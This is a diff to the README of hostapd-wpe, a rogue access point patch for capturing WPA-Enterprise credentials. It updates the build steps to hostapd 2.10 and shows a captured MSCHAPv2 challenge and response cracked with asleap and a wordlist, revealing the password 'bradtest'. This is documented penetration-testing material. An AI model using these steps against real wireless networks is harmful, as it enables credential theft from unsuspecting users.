@@ -44,7 +44,7 @@ Additional WPE command line options are:
 ## Dependencies
 
 - pkg-config
-- libssl 1.0 ideally
+- libssl (1.0 ideally)
 - libnl3 (and genl)
 - sqlite3
 
@@ -65,11 +65,11 @@ apt-get install libssl-dev libnl-genl-3-dev libnl-3-dev pkg-config libsqlite3-de
 ## General
 
 ```
-wget https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/patches/wpe/hostapd-wpe/hostapd-2.9-wpe.patch
-wget https://w1.fi/releases/hostapd-2.9.tar.gz
-tar -zxf hostapd-2.9.tar.gz
-cd hostapd-2.9
-patch -p1 < ../hostapd-2.9-wpe.patch
+wget https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/patches/wpe/hostapd-wpe/hostapd-2.10-wpe.patch
+wget https://w1.fi/releases/hostapd-2.10.tar.gz
+tar -zxf hostapd-2.10.tar.gz
+cd hostapd-2.10
+patch -p1 < ../hostapd-2.10-wpe.patch
 cd hostapd
 ```
 
@@ -105,11 +105,11 @@ challenge: bc:87:6c:48:37:d3:92:6e
 response: 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0
 ```
 
-and as always, we feed them into asleap to crack:
+and finally, feed them into asleap to crack:
 
 ```
 # asleap -C bc:87:6c:48:37:d3:92:6e -R 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0 -W wordlist 
-asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
+asleap 2.3 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
 hash bytes:        b1ca
 NT hash:           e614b958df9df49ec094b8730f0bb1ca
 password:          bradtest
